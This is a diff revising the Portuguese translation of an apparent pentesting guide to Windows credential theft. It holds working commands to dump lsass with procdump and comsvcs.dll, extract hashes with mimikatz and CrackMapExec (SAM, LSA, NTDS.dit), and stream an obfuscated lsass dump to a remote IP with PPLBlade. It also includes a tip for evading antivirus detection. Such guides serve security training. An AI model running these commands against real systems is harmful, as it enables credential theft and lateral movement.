@@ -51,12 +51,16 @@ mimikatz_command -f "lsadump::sam"
 
 Como **Procdump do** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, não é detectado pelo Defender.\
 Você pode usar esta ferramenta para **extrair o processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.
+
+Você também pode usar [SharpDump](https://github.com/GhostPack/SharpDump).
 ```bash:Dump lsass
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 #Remote, mount https://live.sysinternals.com which contains procdump.exe
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Get it from webdav
+\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
 ```c:Extract credentials from the dump
@@ -67,14 +71,14 @@ mimikatz # sekurlsa::logonPasswords
 ```
 Este processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe para despejar lsass.exe**, isso ocorre porque eles estão **detectando** a string **"procdump.exe" e "lsass.exe"**. Portanto, é **mais discreto** passar como um **argumento** o **PID** de lsass.exe para procdump **em vez de** usar o **nome lsass.exe.**
+**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso de **procdump.exe para despejar lsass.exe**, isso ocorre porque eles estão **detectando** a string **"procdump.exe" e "lsass.exe"**. Portanto, é **mais furtivo** passar como um **argumento** o **PID** de lsass.exe para procdump **em vez de** usar o **nome lsass.exe.**
 
 ### Despejando lsass com **comsvcs.dll**
 
 Uma DLL chamada **comsvcs.dll** encontrada em `C:\Windows\System32` é responsável por **despejar a memória do processo** em caso de falha. Esta DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
-Não é relevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser despejado constitui o primeiro componente, o local do arquivo de despejo representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
+É irrelevante usar os dois primeiros argumentos, mas o terceiro é dividido em três componentes. O ID do processo a ser despejado constitui o primeiro componente, o local do arquivo de despejo representa o segundo, e o terceiro componente é estritamente a palavra **full**. Não existem opções alternativas.\
 Ao analisar esses três componentes, a DLL é acionada para criar o arquivo de despejo e transferir a memória do processo especificado para este arquivo.\
-A utilização de **comsvcs.dll** é viável para despejar o processo lsass, eliminando assim a necessidade de fazer upload e executar procdump. Este método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
+A utilização do **comsvcs.dll** é viável para despejar o processo lsass, eliminando assim a necessidade de fazer upload e executar o procdump. Este método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).
 
 O seguinte comando é empregado para execução:
 ```bash
@@ -104,7 +108,7 @@ Get-Process -Name LSASS
 
 1. Contornar a proteção PPL
 2. Ofuscar arquivos de despejo de memória para evitar mecanismos de detecção baseados em assinatura do Defender
-3. Fazer upload de despejo de memória com métodos de upload RAW e SMB sem gravá-lo no disco (despejo sem arquivo)
+3. Fazer upload do despejo de memória com métodos de upload RAW e SMB sem gravá-lo no disco (despejo sem arquivo)
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
@@ -114,16 +118,16 @@ PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmod
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
-### Extrair segredos do LSA
+### Extrair segredos LSA
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
-### Despeje o NTDS.dit do DC de destino
+### Extrair o NTDS.dit do DC alvo
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
-### Extrair o histórico de senhas do NTDS.dit do DC alvo
+### Extrair o histórico de senhas do NTDS.dit do DC de destino
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
@@ -131,11 +135,11 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-## Stealing SAM & SYSTEM
+## Roubo do SAM e SYSTEM
 
-Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode apenas copiá-los de uma maneira regular** porque eles estão protegidos.
+Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode apenas copiá-los de uma maneira regular** porque estão protegidos.
 
-### From Registry
+### Do Registro
 
 A maneira mais fácil de roubar esses arquivos é obter uma cópia do registro:
 ```
@@ -194,7 +198,7 @@ Dentro deste banco de dados, três tabelas principais são mantidas:
 
 Mais informações sobre isso: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
 
-O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é utilizado por _lsass.exe_. Assim, **parte** do arquivo **NTDS.dit** pode ser localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente provavelmente devido à melhoria de desempenho ao usar um **cache**).
+O Windows usa _Ntdsa.dll_ para interagir com esse arquivo e é utilizado por _lsass.exe_. Assim, **parte** do arquivo **NTDS.dit** pode ser localizada **dentro da memória do `lsass`** (você pode encontrar os dados acessados mais recentemente, provavelmente devido à melhoria de desempenho ao usar um **cache**).
 
 #### Descriptografando os hashes dentro do NTDS.dit
 
@@ -244,7 +248,7 @@ lazagne.exe all
 ```
 ## Outras ferramentas para extrair credenciais do SAM e LSASS
 
-### Windows credentials Editor (WCE)
+### Windows Credentials Editor (WCE)
 
 Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
